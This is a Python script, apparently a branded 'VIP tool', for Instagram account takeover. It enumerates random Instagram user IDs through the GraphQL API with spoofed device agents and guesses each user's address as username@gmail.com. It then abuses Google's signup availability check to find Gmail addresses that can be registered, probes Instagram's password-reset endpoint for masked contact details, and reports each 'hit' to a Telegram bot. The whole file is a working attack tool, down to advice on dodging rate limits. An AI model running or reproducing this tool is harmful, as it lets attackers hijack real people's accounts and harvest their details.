import os
import sys
import re
import time
import random
import string
import json
import uuid
import base64
import hashlib
import threading
import requests
import httpx
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.live import Live
from rich.text import Text
from rich.align import Align
from hashlib import md5
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent

# ============================================
# 🔥 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 𝗦𝗖𝗥𝗜𝗣𝗧 — 𝗡𝗔𝗬𝗔 𝗗𝗢𝗖_𝗜𝗗 + 𝗡𝗔𝗬𝗘 𝗘𝗡𝗗𝗣𝗢𝗜𝗡𝗧𝗦
# ============================================

A1    = "\x1b[38;5;214m"
A2    = "\x1b[38;5;196m"
A3    = "\x1b[38;5;226m"
A4    = "\x1b[1;37m"
DIM   = "\x1b[2;37m"
RESET = "\033[0m"

def type_text(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

banner = f"""{A1}
  ╔══════════════════════════════════════════════════╗
  ║                                                  ║
  ║  {A3}  ░▒▓  ANISH BAAP EY  ▓▒░      VIP TOOL🫪 ║
  ║                                                  ║
  ╚══════════════════════════════════════════════════╝
{DIM}              [ ENTER CREDENTIALS TO CONTINUE ]
{RESET}"""

type_text(banner, 0.001)

sys.stdout.write(f"  {A1}╔══[ INPUT ]══════════════════════════════════════╗{RESET}\n")
sys.stdout.write(f"  {A1}║{RESET}  {A3}► TOKEN DAL   :{A4}  ")
sys.stdout.flush()
TOKEN = input().strip()

sys.stdout.write(f"  {A1}║{RESET}  {A3}► CHAT ID  DAL :{A4}  ")
sys.stdout.flush()
CHAT_ID = input().strip()

sys.stdout.write(f"  {A1}╚═════════════════════════════════════════════════╝{RESET}\n\n")
sys.stdout.flush()

# ============================================
# 🔥 𝗛𝗔𝗥 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 𝗞𝗘 𝗡𝗔𝗠𝗘 (𝟮𝟬𝟬+)
# ============================================

ALL_NAMES = [
    # India
    "rahul", "raj", "amit", "sonu", "monu", "priya", "neha", "anjali", "meera",
    "rohit", "mohit", "sanjay", "vijay", "ajay", "suresh", "ramesh", "deepak",
    "sunil", "anil", "vikas", "naveen", "pankaj", "lata", "mala", "sita", "gita",
    "rita", "mina", "tina", "sana",
    # USA
    "john", "jane", "mike", "sarah", "david", "emma", "oliver", "charlie",
    "james", "mary", "robert", "linda", "william", "barbara", "richard", "susan",
    # UK
    "jack", "jill", "harry", "lucy", "george", "amelia", "oscar", "olivia",
    "alfie", "lily", "archie", "ella", "arthur", "grace", "freddie", "rose",
    # Russia
    "alexander", "dmitry", "sergei", "ivan", "vladimir", "anna", "olga", "maria",
    "ekaterina", "tatyana", "mikhail", "andrei", "viktoria", "elena", "yuri",
    # Japan
    "haruki", "yuki", "sakura", "ren", "haru", "mei", "sora", "aoi", "hina",
    "riku", "niko", "yuna", "itsuki", "hinata", "kaede",
    # Brazil
    "joao", "maria", "jose", "ana", "pedro", "carlos", "fernanda", "lucas",
    "paula", "marcos", "camila", "rafael", "julia", "felipe", "larissa",
    # France
    "jean", "marie", "pierre", "sophie", "louis", "emma", "lucas", "lea",
    "gabriel", "camille", "jules", "ines", "adrien", "lois", "martin",
    # Germany
    "lukas", "anna", "max", "emma", "felix", "sophie", "paul", "mia",
    "jonas", "emily", "jakob", "lina", "tobias", "lea", "leon",
    # Italy
    "alessandro", "francesca", "marco", "giulia", "giuseppe", "anna", "antonio",
    "elena", "matteo", "sara", "andrea", "chiara", "luca", "martina", "davide",
    # Spain
    "alejandro", "carmen", "javier", "isabel", "manuel", "laura", "jose", "ana",
    "pedro", "maria", "david", "pilar", "juan", "teresa", "antonio",
    # Turkey
    "mehmet", "ayse", "ali", "fatma", "ahmet", "mustafa", "zeynep", "hakan",
    "elif", "emre", "seda", "burak", "ozlem", "tugba", "mert",
    # UAE
    "mohammed", "fatima", "ahmed", "aisha", "ali", "maryam", "omar", "khadija",
    "abubakar", "hassan", "zainab", "abdullah", "halima", "ibrahim", "aminah",
    # Pakistan
    "muhammad", "zainab", "hassan", "fatima", "ali", "ayesha", "usman", "hadia",
    "adil", "rabia", "sara", "mahad", "huma", "sultan", "hina",
    # Bangladesh
    "mohammad", "taslima", "rahim", "sajeda", "karim", "hasina", "jabbar",
    "shahida", "rahman", "sultana", "rokeya", "hamid", "nasima", "aziz", "maryam",
    # Nigeria
    "chidi", "ngozi", "amara", "uche", "chioma", "emeka", "funke", "chima",
    "oluchi", "ike", "folake", "tunde", "bisi", "segun", "joke",
    # South Africa
    "thabo", "lebo", "neo", "mpho", "bongani", "lerato", "nelson", "zanele",
    "siya", "amahle", "lindiwe", "sipho", "nosipho", "vusi", "nomsa",
    # Australia
    "jack", "olivia", "william", "charlotte", "noah", "amelia", "henry", "isla",
    "lucas", "mia", "oliver", "ella", "james", "grace", "ethan",
    # Canada
    "liam", "ava", "ethan", "olivia", "noah", "emma", "lucas", "charlotte",
    "jack", "abigail", "mason", "sofia", "logan", "avery", "jacob",
    # Mexico
    "juan", "maria", "jose", "luz", "carlos", "guadalupe", "antonio", "juana",
    "miguel", "margarita", "francisco", "rosa", "jesus", "celia", "manuel",
    # Argentina
    "juan", "maria", "jose", "ana", "carlos", "laura", "pablo", "lucia",
    "miguel", "camila", "gonzalo", "valentina", "franco", "agustina", "facundo",
]

# ============================================
# 🔥 𝗖𝗢𝗡𝗙𝗜𝗚 𝗠𝗔𝗡𝗔𝗚𝗘𝗥 (𝗨𝗣𝗗𝗔𝗧𝗘𝗗)
# ============================================

class ConfigManager:
    O = '\x1b[38;5;208m'
    R = '\033[1;31m'
    X = '\033[1;33m'
    F = '\033[2;32m'
    C = "\033[1;97m"
    B = '\033[2;36m'
    K = '\033[2;35m'
    C1 = '\033[2;35m'
    Rn = "\033[0m"
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'

    UID_RANGES = {
        "1": (210468786, 269736186),
        "2": (390438486, 495999999),
        "3": (1479010000, 1679010000),
        "4": (1700000000, 2400000000),
        "5": (3313668786, 3713668786),
        "6": (5398785217, 5999785217),
        "7": (7497939245, 8597939245),
        "8": (11254029834, 21254029834),
        "9": (210468786, 21254029834),
    }

    def __init__(self, token, chat_id):
        self.console = Console()
        self.selected_year = None
        self.filter_type = None
        self.uid_min = None
        self.uid_max = None
        self.TOKEN = token
        self.CHAT_ID = chat_id
        self._show_banner()
        self._select_year()
        self._select_filter()
        self._setup_uid_range()

    def _show_banner(self):
        self.console.clear()
        self.console.print()
        self.console.print("[bold #ff8c00]  ╔══════════════════════════════════════════════════╗[/bold #ff8c00]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]  [bold #ffdd00]  ░▒ANISH BAAP EY  ▒░    VIP TOOL 🫪    [/bold #ffdd00]  [bold #ff8c00]║[/bold #ff8c00]")
        self.console.print("[bold #ff8c00]  ╚══════════════════════════════════════════════════╝[/bold #ff8c00]")
        self.console.print()

    def _select_year(self):
        self.console.print("[bold #ff8c00]  ╔══[ YEAR SELECT KR ]══════════════════════════╗[/bold #ff8c00]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]  [bold #ffdd00]  [1] 2012[/bold #ffdd00]  [bold white]  [2] 2013  [3] 2014  [4] 2015[/bold white]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]  [bold white]  [5] 2016    [6] 2017    [7] 2018    [8] 2019[/bold white]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]  [bold #ff4444]  [9]  ALL YEARS  ( 2012 — 2019 )[/bold #ff4444]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]")
        self.console.print("[bold #ff8c00]  ╚══════════════════════════════════════════════════╝[/bold #ff8c00]")

        ch = self.console.input("[bold #ffdd00]  ◄ INPUT ► [/bold #ffdd00]")

        while ch not in ["1", "2", "3", "4", "5", "6", "7", "8", "9"]:
            self.console.print("[bold #ff4444]  ✖  INVALID — TRY AGAIN[/bold #ff4444]")
            ch = self.console.input("[bold #ffdd00]  ◄ INPUT ► [/bold #ffdd00]")

        self.selected_year = ch
        self.console.clear()

    def _select_filter(self):
        self.console.print()
        self.console.print("[bold #ff8c00]  ╔══[ ACCOUNT TYPE KONSA ? ]════════════════════════╗[/bold #ff8c00]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]  [bold white]  [1]  ZERO POST[/bold white]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]  [bold white]  [2]  MORE THAN ZERO POST  [/bold white][dim]( LATE HITS )[/dim]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]  [bold #ffdd00]  [3]  ALL  [/bold #ffdd00][dim]( FAST MODE )[/dim]")
        self.console.print("[bold #ff8c00]  ║[/bold #ff8c00]")
        self.console.print("[bold #ff8c00]  ╚══════════════════════════════════════════════════╝[/bold #ff8c00]")

        ch2 = self.console.input("[bold #ffdd00]  ◄ INPUT ► [/bold #ffdd00]")

        while ch2 not in ["1", "2", "3"]:
            self.console.print("[bold #ff4444]  ✖  WRONG CHOICE — ENTER 1, 2 OR 3[/bold #ff4444]")
            ch2 = self.console.input("[bold #ffdd00]  ◄ INPUT ► [/bold #ffdd00]")

        self.filter_type = ch2
        self.console.clear()

    def _setup_uid_range(self):
        self.uid_min, self.uid_max = self.UID_RANGES[self.selected_year]

# ============================================
# 🔥 𝗚𝗢𝗢𝗚𝗟𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥
# ============================================

class GoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        self.token_ready = False
        Thread(target=self._refresh_token, daemon=True).start()

    def _generate_ua(self):
        return generate_user_agent()

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

                headers = {
                    "accept": "*/*",
                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": str(self._generate_ua()),
                }

                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                ).group(2)

                cookies = {'__Host-GAPS': host}
                headers2 = {
                    'authority': 'accounts.google.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'google-accounts-xsrf': '1',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                    'user-agent': self._generate_ua(),
                }

                data = {
                    'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                }

                response = requests.post(
                    'https://accounts.google.com/_/signup/validatepersonaldetails',
                    cookies=cookies,
                    headers=headers2,
                    data=data,
                )

                tl = str(response.text).split('",null,"')[1].split('"')[0]
                host = response.cookies.get_dict()['__Host-GAPS']

                try:
                    os.remove('tl.txt')
                except:
                    pass

                with open('tl.txt', 'a') as f:
                    f.write(tl + '//' + host + '\n')

                time.sleep(random.uniform(10, 30))

            except Exception:
                time.sleep(random.uniform(5, 15))

    def check_availability(self, email):
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            try:
                with open('tl.txt', 'r') as f:
                    o = f.read().splitlines()[0]
            except:
                time.sleep(2)
                with open('tl.txt', 'r') as f:
                    o = f.read().splitlines()[0]

            tl, host = o.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
                'user-agent': self._generate_ua(),
            }

            params = {'TL': tl}
            data = (
                f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
                f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
                f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
                f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
                f'&cookiesDisabled=false'
                f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
                f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
            )

            response = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
            )

            if '"gf.uar",1' in str(response.text):
                return 'good'
            elif '"er",null,null,null,null,400' in str(response.text):
                time.sleep(1)
                return self.check_availability(email)
            else:
                return 'bad'
        except:
            return self.check_availability(email)

# ============================================
# 🔥 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 (𝗨𝗣𝗗𝗔𝗧𝗘𝗗)
# ============================================

class InstagramChecker:
    def __init__(self, google_checker: GoogleChecker, config: ConfigManager):
        self.google = google_checker
        self.config = config

    def _generate_android_ua(self):
        devices = [
            {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820", "cpu": "exynos9820"},
            {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825", "cpu": "exynos1280"},
            {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama", "cpu": "qcom"},
            {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven", "cpu": "gs101"},
            {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther", "cpu": "gs201"},
            {"brand": "Xiaomi", "model": "M2102J20SG", "device": "ares", "board": "mt6893", "cpu": "mtk"},
            {"brand": "Xiaomi", "model": "Redmi Note 10", "device": "sweet", "board": "sm6150", "cpu": "qcom"},
            {"brand": "OnePlus", "model": "ONEPLUS A6003", "device": "OnePlus6", "board": "sdm845", "cpu": "qcom"},
            {"brand": "OPPO", "model": "CPH2371", "device": "OP4F1F", "board": "mt6893", "cpu": "mtk"},
            {"brand": "HUAWEI", "model": "ELE-L29", "device": "HWELE", "board": "kirin980", "cpu": "hisilicon"},
        ]

        device = random.choice(devices)
        android_version = random.choice(["10", "11", "12", "13", "14"])
        api_level = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
        dpi = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
        width = random.choice(["720", "1080", "1440"])
        height = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
        instagram_ver = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
        locale = random.choice(["en_US", "en_GB", "ar_SA"])
        random_num = random.randint(300000000, 400000000)

        return (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
                f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
                f"{device['device']}; {device['board']}; {locale}; {random_num})")

    def get_rest_info(self, username):
        android_ua = self._generate_android_ua()
        ig_did = str(uuid.uuid4()).upper()
        mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]

        headers = {
            "User-Agent": android_ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ig-app-id": "567067343352427",
            "x-ig-device-id": ig_did,
            "x-ig-connection-type": "WIFI",
            "x-ig-capabilities": "3brTvw==",
            "x-ig-www-claim": "0",
            "x-ig-ajax": str(random.randint(1000000000, 9999999999)),
            "x-csrftoken": "missing",
            "Origin": "https://www.instagram.com",
            "Referer": "https://instagram.com/accounts/password/reset/?source=fxcal",
            "Cookie": f"ig_did={ig_did}; mid={mid}; csrftoken=missing",
        }

        try:
            with httpx.Client(http2=True, headers=headers, timeout=20) as client:
                r = client.post(
                    "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                    data={"email_or_username": username}
                ).text

            data = json.loads(r)
            if "contact_point" in data:
                return data["contact_point"]
        except:
            pass

        return "CUTE RESET"

    def fetch_profile(self, username, domain="gmail.com"):
        url = f'https://www.instagram.com/{username}/'

        try:
            response = requests.get(url, timeout=15)
            soup = BeautifulSoup(response.text, 'html.parser')
            meta_description = soup.find('meta', attrs={'name': 'description'})
            name_tag = soup.find('meta', property='og:title')

            if meta_description and name_tag:
                content = meta_description.get('content').replace(',', '')
                parts = content.split()

                return {
                    'name': name_tag['content'].split('(@')[0].strip(),
                    'username': username,
                    'email': f"{username}@{domain}",
                    'followers': parts[0],
                    'following': parts[2],
                    'posts': parts[4],
                    'url': url,
                    'rest': self.get_rest_info(username)
                }
        except:
            pass

        return {
            'username': username,
            'email': f"{username}@{domain}",
            'url': url,
            'rest': self.get_rest_info(username)
        }

    def check_email(self, email):
        android_ua = self._generate_android_ua()

        url = "https://i.instagram.com/api/v1/users/check_email/"
        headers = {
            'User-Agent': android_ua,
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
        }

        try:
            with httpx.Client(http2=True) as client:
                response = client.post(url, data=f"email={email}", headers=headers)

            if 'email_is_taken' in str(response.text):
                return True
            return False
        except:
            return False

# ============================================
# 🔥 𝗗𝗜𝗦𝗣𝗟𝗔𝗬 𝗠𝗔𝗡𝗔𝗚𝗘𝗥
# ============================================

class DisplayManager:
    OR    = "\x1b[38;5;214m"
    YL    = "\x1b[38;5;226m"
    RD    = "\x1b[38;5;196m"
    WT    = "\x1b[1;37m"
    DIM   = "\x1b[2;37m"
    RESET = "\033[0m"

    def __init__(self, config: ConfigManager):
        self.config = config
        self.hits = 0
        self.bad_insta = 0
        self.bad_email = 0
        self.current_email = ""
        self.results = []
        self.lock = threading.Lock()
        self._running = True
        self._start_display_thread()

    def _draw_panel(self):
        W = 51

        top  = f"{self.OR}  ╔══════════════════[ LIVE STATS ]══════════════════╗{self.RESET}"
        sep  = f"{self.OR}  ╠═══════════════════════════════════════════════════╣{self.RESET}"
        bot  = f"{self.OR}  ╚═══════════════════════════════════════════════════╝{self.RESET}"
        bar  = f"{self.OR}  ║{self.RESET}"

        def row(label_color, label, value, value_color):
            val_str = str(value)
            pad = W - len(label) - len(val_str) - 8
            if pad < 0:
                pad = 0
            return (
                f"{bar}  {label_color}{label}{self.RESET}"
                f"  ►  {value_color}{val_str}{self.RESET}"
                f"{' ' * pad}{self.OR}║{self.RESET}"
            )

        current_display = self.current_email[:34]
        cur_pad = W - len("SCANNING") - len(current_display) - 8
        if cur_pad < 0:
            cur_pad = 0
        cur_row = (
            f"{bar}  {self.DIM}SCANNING{self.RESET}"
            f"  ►  {self.WT}{current_display}{self.RESET}"
            f"{' ' * cur_pad}{self.OR}║{self.RESET}"
        )

        lines = [
            top,
            row(self.YL,  "  HITS      ", self.hits,      self.YL),
            row(self.RD,  "  BAD INSTA ", self.bad_insta, self.WT),
            row(self.RD,  "  BAD EMAIL ", self.bad_email, self.WT),
            sep,
            cur_row,
            bot,
        ]

        panel_str = "\n".join(lines)
        footer = f"  {self.DIM}▸ TOGGLE AIRPLANE MODE  OR  CHANGE VPN SERVER ...{self.RESET}"
        return panel_str + "\n" + footer

    def _start_display_thread(self):
        def update_loop():
            sys.stdout.write("\033[?25l")
            while self._running:
                panel_str = self._draw_panel()
                lines_count = len(panel_str.splitlines())
                sys.stdout.write(f"\033[{lines_count}A")
                sys.stdout.write(panel_str)
                sys.stdout.write("\n")
                sys.stdout.flush()
                time.sleep(0.3)
            sys.stdout.write("\033[?25h")
            sys.stdout.flush()

        Thread(target=update_loop, daemon=True).start()

    def stop(self):
        self._running = False

    def update_stats(self, hits=None, bad_insta=None, bad_email=None, current_email=None):
        with self.lock:
            if hits is not None:
                self.hits = hits
            if bad_insta is not None:
                self.bad_insta = bad_insta
            if bad_email is not None:
                self.bad_email = bad_email
            if current_email is not None:
                self.current_email = current_email

    def print_hit(self, msg):
        with self.lock:
            sys.stdout.write("\n")
            sys.stdout.write(self.config.GREEN + "=" * 55 + self.config.RESET + "\n")
            sys.stdout.write(msg + "\n")
            sys.stdout.write(self.config.GREEN + "=" * 55 + self.config.RESET + "\n")
            sys.stdout.flush()

# ============================================
# 🔥 𝗥𝗘𝗣𝗢𝗥𝗧 𝗠𝗔𝗡𝗔𝗚𝗘𝗥
# ============================================

class ReportManager:
    def __init__(self, config: ConfigManager):
        self.config = config

    def send_telegram(self, msg):
        try:
            requests.get(
                f"https://api.telegram.org/bot{self.config.TOKEN}/sendMessage",
                params={"chat_id": self.config.CHAT_ID, "text": msg, "parse_mode": "HTML"},
                timeout=10
            )
        except:
            pass

    def save_to_file(self, msg, filename='hits1.txt'):
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{msg}\n')

    def format_result(self, data, year, filter_type):
        if 'name' in data:
            msg = f'''
  ╭┈ ⌗ 💭 ₊˚⊹
│
│  ANISH BHAGWAN EY
│  ───────────────
│
│   𝐍𝐚𝐦𝐞      → {data['name']}
│   𝐔𝐬𝐞𝐫      → @{data['username']}
│  🐠𝐌𝐚𝐢𝐥   → {data['email']}
│
│  ✦ 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐒𝐭𝐚𝐭𝐬
│   𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 → {data['followers']}
│   𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 → {data['following']}
│  𝐏𝐨𝐬𝐭𝐬     → {data['posts']}
│
│   𝐑𝐞𝐬𝐭
│  ↳ {data['rest']}
│
│  ✧ 𝐋𝐢𝐧𝐤
│  ↳ https://www.instagram.com/{data['username']}
│
│ ANISH BAAP EY
╰────────── ♡ ──────────╯
      “review
      de de” 🫪
'''
        else:
            msg = f'''
  ╭┈ ⌗ 💭 ₊˚⊹
│
│  ANISH BHAGWAN EY
│  ───────────────
│   𝐔𝐬𝐞𝐫      → @{data['username']}
│   𝐌𝐚𝐢𝐥   → {data['email']}
│
│  ✧ 𝐋𝐢𝐧𝐤
│  ↳ https://www.instagram.com/{data['username']}
│
│ ANISH BAAP EY
╰────────── ♡ ──────────╯
      “review
      de dio” 🫪
'''
        return msg

# ============================================
# 🔥 𝗨𝗦𝗘𝗥 𝗖𝗢𝗟𝗟𝗘𝗖𝗧𝗢𝗥 (𝗨𝗣𝗗𝗔𝗧𝗘𝗗)
# ============================================

class UserCollector:
    def __init__(self, config: ConfigManager, insta_checker: InstagramChecker,
                 display: DisplayManager, reporter: ReportManager):
        self.config = config
        self.insta = insta_checker
        self.display = display
        self.reporter = reporter

        self.found_usernames = set()
        self.processed_ids = set()
        self.lock = threading.Lock()
        self.hits = 0
        self.bad_insta = 0
        self.bad_email = 0

    def _get_year_display(self):
        year_map = {"1": 2012, "2": 2013, "3": 2014, "4": 2015,
                    "5": 2016, "6": 2017, "7": 2018, "8": 2019, "9": "All"}
        return year_map[self.config.selected_year]

    def _should_skip_user(self, user_data):
        username = user_data.get('username', '')

        if '_' in username:
            return True

        if len(username) < 8:
            return True

        is_private = user_data.get('is_private', True)
        follower_count = user_data.get('follower_count', 0)
        following_count = user_data.get('following_count', 0)
        media_count = user_data.get('media_count', 0)

        if self.config.filter_type == "1":
            if is_private or media_count > 0:
                return True
        elif self.config.filter_type == "2":
            if is_private or media_count == 0:
                return True

        return False

    def _generate_user_agent(self):
        rnd = str(random.randint(150, 999))
        return ("Instagram 311.0.0.32.118 Android ("
                + random.choice(["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"])
                + "; " + str(random.randint(100, 1300)) + "dpi; "
                + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; "
                + random.choice(["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME", "INFINIX"])
                + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"
                + str(random.randint(111, 999)) + ")")

    def _get_random_id(self):
        while True:
            uid = str(random.randrange(self.config.uid_min, self.config.uid_max))
            with self.lock:
                if uid not in self.processed_ids:
                    self.processed_ids.add(uid)
                    return uid

    def _process_user(self):
        while True:
            try:
                uid = self._get_random_id()
                lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))

                headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/cristiano/following/',
                    'user-agent': self._generate_user_agent(),
                    'x-fb-friendly-name': 'PolarisProfilePageContentQuery',  # 🔥 NAYA
                    'x-ig-app-id': '936619743392459',  # 🔥 NAYA APP ID
                    'x-fb-lsd': lsd,
                }

                data = {
                    'lsd': lsd,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
                    'variables': f'{{"enable_integrity_filters":true,"id":"{uid}","__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider":true,"__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider":false,"__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider":false,"__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider":false}}',
                    'server_timestamps': 'true',
                    'doc_id': '26672929172408668',  # 🔥 NAYA DOC_ID
                }

                response = requests.post(
                    'https://www.instagram.com/api/graphql',
                    headers=headers,
                    data=data,
                    timeout=15
                )

                try:
                    resp_json = response.json()
                except:
                    time.sleep(random.uniform(0.5, 1.5))
                    continue

                user_data = resp_json.get('data', {}).get('user', {})
                if not user_data:
                    time.sleep(random.uniform(0.5, 1.5))
                    continue

                username = user_data.get('username', '')

                with self.lock:
                    if username in self.found_usernames:
                        time.sleep(random.uniform(0.1, 0.3))
                        continue

                if self._should_skip_user(user_data):
                    time.sleep(random.uniform(0.1, 0.3))
                    continue

                with self.lock:
                    self.found_usernames.add(username)

                email = f"{username}@gmail.com"

                self.display.update_stats(current_email=email)

                time.sleep(random.uniform(0.3, 1.0))

                if self.insta.check_email(email):
                    time.sleep(random.uniform(0.3, 0.8))

                    if self.insta.google.check_availability(email) == 'good':
                        profile_data = self.insta.fetch_profile(username, "gmail.com")

                        with self.lock:
                            self.hits += 1
                            if self.hits % 10 == 0 and os.path.exists("tl.txt"):
                                os.remove("tl.txt")

                        self.display.update_stats(hits=self.hits)

                        year = self._get_year_display()
                        msg = self.reporter.format_result(profile_data, year, self.config.filter_type)
                        self.display.print_hit(msg)
                        self.reporter.send_telegram(msg)
                        self.reporter.save_to_file(msg)
                    else:
                        with self.lock:
                            self.bad_email += 1
                        self.display.update_stats(bad_email=self.bad_email)
                else:
                    with self.lock:
                        self.bad_insta += 1
                    self.display.update_stats(bad_insta=self.bad_insta)

                time.sleep(random.uniform(0.2, 0.8))

            except Exception:
                time.sleep(random.uniform(0.5, 2.0))
                continue

    def start(self, thread_count=30):  # 🔥 100 SE 30 KAR DIYA
        threads = []
        for _ in range(thread_count):
            t = Thread(target=self._process_user)
            t.daemon = True
            t.start()
            threads.append(t)
        return threads

# ============================================
# 🔥 𝗠𝗔𝗜𝗡
# ============================================

def main():
    config = ConfigManager(TOKEN, CHAT_ID)
    google_checker = GoogleChecker()
    insta_checker = InstagramChecker(google_checker, config)
    display = DisplayManager(config)
    reporter = ReportManager(config)
    collector = UserCollector(config, insta_checker, display, reporter)

    threads = collector.start(thread_count=30)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        display.stop()
        config.console.print("\n[bold #ff8c00]  ◄  ANISH GOD ►[/bold #ff8c00]")

if __name__ == "__main__":
    main()